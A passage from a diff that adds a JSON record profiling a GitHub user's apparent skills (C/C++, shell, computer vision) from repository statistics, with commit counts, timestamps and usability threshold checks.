+      "total_bytes": 0,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: test file (framework/address/norm_test.go)"
+      ]
+    },
+    {
+      "skill_id": "c-cpp",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.4064060044458743,
+      "total_bytes": 9677,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: C: 9,677 bytes (1% of repo)"
+      ]
+    },
+    {
+      "skill_id": "shell",
+      "repos": [
+        "keanhor2/madmail"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 0.4038408223411143,
+      "total_bytes": 5802,
+      "commit_count": 4,
+      "first_seen": "2025-10-30T14:21:45+00:00",
+      "last_seen": "2026-09-17T00:21:59+00:00",
+      "details": [
+        "madmail: Shell: 5,802 bytes (0% of repo)"
+      ]
+    },
+    {
+      "skill_id": "computer-vision",
+      "repos": [
+        "keanhor2/Kea-CV"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "repo_name"
+      ],
+      "max_strength": 0.2,
+      "total_bytes": 0,
+      "commit_count": 23,
+      "first_seen": "2021-11-08T01:46:17+00:00",
+      "last_seen": "2026-02-21T20:42:16+00:00",
+      "details": [
+        "Kea-CV: 'cv' in repo name/description"
+      ]
+    }
+  ],
+  "tier": "strict",
+  "usability": {
+    "tier": "strict",
+    "checks": {
+      "skill_relevant_repos": {
+        "actual": 5,
+        "required": 3,
+        "tier": "relaxed"
+      },
+      "readable_repos": {
+        "actual": 2,
+        "required": 1,
+        "tier": "relaxed"
+      },
+      "total_commits": {
+        "actual": 39,
+        "required": 20,
+        "tier": "strict"
+      },
+      "distinct_skills": {
+        "actual": 8,
+        "required": 3,
+        "tier": "strict"
+      }
+    },
+    "failed": [],
+    "reason": "meets all thresholds"
+  },
+  "search_stratum": "go-systems",
+  "collected_at": "2026-09-17T01:27:42.924025+00:00",
+  "collector_version": "0.1.0",
+  "notes": []
+}
